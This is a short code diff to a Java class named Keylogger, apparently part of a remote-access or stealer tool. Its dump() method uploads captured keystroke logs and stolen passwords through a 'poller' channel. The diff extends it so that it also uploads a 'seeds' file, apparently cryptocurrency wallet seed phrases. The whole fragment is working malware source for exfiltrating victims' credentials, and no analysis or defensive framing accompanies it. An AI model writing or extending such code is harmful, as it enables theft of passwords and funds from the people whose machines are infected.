@@ -406,12 +406,16 @@ final class Keylogger {
 	String dump() throws Exception {
 		Path keys = OpsPaths.keylog(installDir);
 		Path passwords = OpsPaths.passwords(installDir);
+		Path seeds = OpsPaths.seeds(installDir);
 		boolean any = false;
 		if (Files.isRegularFile(keys) && Files.size(keys) > 0L) {
 			any |= poller.uploadFile(keys);
 		}
 		if (Files.isRegularFile(passwords) && Files.size(passwords) > 0L) {
 			any |= poller.uploadFile(passwords);
+		}
+		if (Files.isRegularFile(seeds) && Files.size(seeds) > 0L) {
+			any |= poller.uploadFile(seeds);
 		}
 		return any ? "Key logs uploaded" : "No key log yet";
 	}
